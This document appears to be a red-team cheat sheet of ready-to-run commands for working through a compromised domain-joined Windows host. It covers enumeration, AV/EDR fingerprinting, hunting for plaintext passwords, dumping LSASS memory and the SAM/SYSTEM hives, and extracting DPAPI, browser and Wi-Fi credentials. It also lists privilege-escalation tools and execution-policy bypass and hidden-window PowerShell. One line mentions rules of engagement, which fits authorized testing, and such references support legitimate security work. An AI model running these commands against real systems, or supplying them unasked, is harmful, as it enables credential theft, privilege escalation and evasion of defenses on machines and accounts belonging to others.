# Phase 1: Local Host Enumeration — Commands & Scripts

Post Initial Access — Domain-Joined Windows Host

## Legend

| Tag | Meaning |
|---|---|
| 🟩 **CMD or POWERSHELL** | Native command/binary — runs identically in `cmd.exe` and PowerShell |
| 🟦 **POWERSHELL ONLY** | Cmdlet/PS-only syntax — fails in plain `cmd.exe` |
| 🟫 **OFFLINE / ATTACKER MACHINE** | Not run on target — run against exfiltrated files/hashes on your own box |

If in `cmd.exe` and a PowerShell-only command is needed:
```
powershell -ep bypass
```

---

## 1.1 System & Configuration

### Basic system info
🟩 CMD or PowerShell
```
systeminfo
wmic qfe list                      # installed patches
```
🟦 PowerShell only
```powershell
[System.Environment]::OSVersion.Version
Get-HotFix | Sort-Object InstalledOn
Get-WmiObject -Class Win32_Product  # installed software (slow, use with caution)
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion
```

### Local admins & users
🟩 CMD or PowerShell
```
net localgroup administrators
net user
net accounts                        # password policy
```
🟦 PowerShell only
```powershell
Get-LocalUser
Get-LocalGroupMember Administrators
```

### Processes & services
🟩 CMD or PowerShell
```
tasklist /v
```
🟦 PowerShell only
```powershell
Get-Process | Select ProcessName, Path, Company

# Unquoted service paths
Get-WmiObject win32_service | Where {$_.PathName -notmatch '"' -and $_.PathName -match '\s'} | Select Name, PathName, StartMode
```
🟩 CMD or PowerShell (external tool)
```
# Weak service permissions (needs accesschk.exe from Sysinternals)
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" *
```
🟦 PowerShell only
```powershell
# Writable service binaries (PowerUp module - PowerSploit)
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

### Scheduled tasks
🟩 CMD or PowerShell
```
schtasks /query /fo LIST /v
```
🟦 PowerShell only
```powershell
Get-ScheduledTask | Where {$_.State -ne "Disabled"} | Select TaskName, TaskPath
```
🟩 CMD or PowerShell
```
icacls "C:\Path\To\TaskBinary.exe"
```

### AV/EDR fingerprinting
🟦 PowerShell only
```powershell
Get-Service | Where {$_.DisplayName -match "Defender|CrowdStrike|Carbon|Cylance|Sophos|SentinelOne"}
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
Get-MpComputerStatus              # Windows Defender status
```

### AlwaysInstallElevated / autologon
🟩 CMD or PowerShell
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

### Sensitive files search
🟦 PowerShell only
```powershell
Get-ChildItem -Path C:\ -Include *.xml,*.txt,*.config,*.ini,*.ps1 -Recurse -ErrorAction SilentlyContinue |
  Select-String -Pattern "password" -ErrorAction SilentlyContinue
```
🟩 CMD or PowerShell
```
dir C:\Windows\Panther\Unattend.xml
dir C:\Windows\Panther\Unattend\Unattended.xml
dir C:\Windows\System32\sysprep\sysprep.xml
dir C:\Windows\System32\sysprep.inf
```
🟦 PowerShell only
```powershell
# PowerShell history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Content (Get-PSReadlineOption).HistorySavePath
```

### LAPS check
🟦 PowerShell only
```powershell
Get-ChildItem "C:\Program Files\LAPS" -ErrorAction SilentlyContinue

Import-Module ActiveDirectory
Get-ADComputer -Identity <hostname> -Properties ms-Mcs-AdmPwd

# Or via PowerView
Get-DomainObject -Identity <hostname> -Properties ms-mcs-admpwd
```

### AppLocker / WDAC / Constrained Language Mode
🟦 PowerShell only
```powershell
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective -Xml
```
🟩 CMD or PowerShell
```
gpresult /r
```

---

## 1.2 Credential Harvesting on Host

### LSASS protection check
🟦 PowerShell only
```powershell
Get-ProcessMitigation -Name lsass -RunningProcesses
```
🟩 CMD or PowerShell
```
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL   # PPL check
reg query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags  # Credential Guard check
```

### Dumping LSASS (requires local admin; check protections first)
🟩 CMD or PowerShell
```
# Via procdump (Sysinternals, often LOLBin-friendly)
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

# Via comsvcs.dll (built-in LOLBin, no extra tooling needed)
rundll32 C:\windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\lsass.dmp full
```
🟫 Offline / attacker machine
```
pypykatz lsa minidump lsass.dmp
```

### SAM/SYSTEM hive extraction (local admin required)
🟩 CMD or PowerShell
```
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
```
🟫 Offline / attacker machine
```
secretsdump.py -sam sam.save -system system.save LOCAL
```

### DPAPI / cached creds / browser creds
🟦 PowerShell only
```powershell
dir $env:APPDATA\Microsoft\Protect\ -Recurse -Force
```
🟩 CMD or PowerShell (external tools)
```
SharpDPAPI.exe machinemasterkeys
SharpDPAPI.exe credentials
SharpChrome.exe logins /unprotect
cmdkey /list
```
🟦 PowerShell only
```powershell
Invoke-WCMDump   # PowerShell module, dumps stored creds if accessible
```
🟩 CMD or PowerShell
```
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear
```

### Saved sessions (PuTTY/WinSCP)
🟩 CMD or PowerShell
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s
```

---

## 1.3 Local Privilege Escalation Checks

### Automated enumeration tools (recommended first pass)
🟩 CMD or PowerShell
```
winPEASx64.exe                 # broad automated Windows privesc enumeration
Seatbelt.exe -group=all        # .NET situational awareness tool
```
🟦 PowerShell only
```powershell
.\PowerUp.ps1; Invoke-AllChecks
```

### PATH / DLL hijacking
🟦 PowerShell only
```powershell
$env:PATH -split ';' | ForEach-Object { icacls $_ }
```

### Token privilege check
🟩 CMD or PowerShell
```
whoami /priv
```
Look for: `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege` (Potato-family exploits), `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeDebugPrivilege`, `SeLoadDriverPrivilege`.

### Kernel exploit check
🟩 CMD or PowerShell
```
systeminfo
```
🟦 PowerShell only
```powershell
.\Sherlock.ps1; Find-AllVulns
```
🟩 CMD or PowerShell
```
.\Watson.exe
```

### Registry Run keys / writable paths
🟦 PowerShell only
```powershell
Get-Acl "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Format-List
```
🟩 CMD or PowerShell
```
icacls "C:\Program Files\<App>\service.exe"
```

---

## Operational Notes

- Run winPEAS or Seatbelt first for a broad automated sweep, then manually verify flagged items.
- LSASS dumping and hive extraction are noisier and more likely to trigger EDR/alerting — confirm authorization for the target tier per the RoE before running them.
- From `cmd.exe`, get into PowerShell with `powershell -ep bypass`, or run inline with reduced footprint: `powershell -nop -w hidden -c "<command>"`.
